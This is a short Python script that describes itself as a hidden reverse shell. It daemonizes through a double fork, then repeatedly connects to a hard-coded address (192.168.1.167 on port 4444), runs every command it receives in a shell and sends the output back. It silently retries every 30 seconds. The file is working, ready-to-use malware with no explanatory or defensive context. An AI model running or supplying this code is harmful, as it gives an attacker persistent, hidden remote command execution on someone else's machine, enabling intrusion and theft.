#!/usr/bin/env python3
# Hidden reverse shell - runs as inline command
import socket,subprocess,os,time,sys

def daemonize():
    """Run as background daemon"""
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        sys.exit(1)
    
    os.chdir("/")
    os.setsid()
    os.umask(0)
    
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        sys.exit(1)
    
    sys.stdout.flush()
    sys.stderr.flush()

def connect():
    """Main connection loop - completely silent"""
    while True:
        try:
            s = socket.socket()
            s.settimeout(30)
            s.connect(("192.168.1.167", 4444))
            s.send(b"READY")
            
            while True:
                data = s.recv(1024).decode().strip()
                if not data:
                    continue
                if data == 'exit':
                    break
                result = subprocess.run(data, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                s.send(output.encode())
                
        except:
            time.sleep(30)
            continue
        finally:
            try:
                s.close()
            except:
                pass

if __name__ == "__main__":
    daemonize()
    connect()
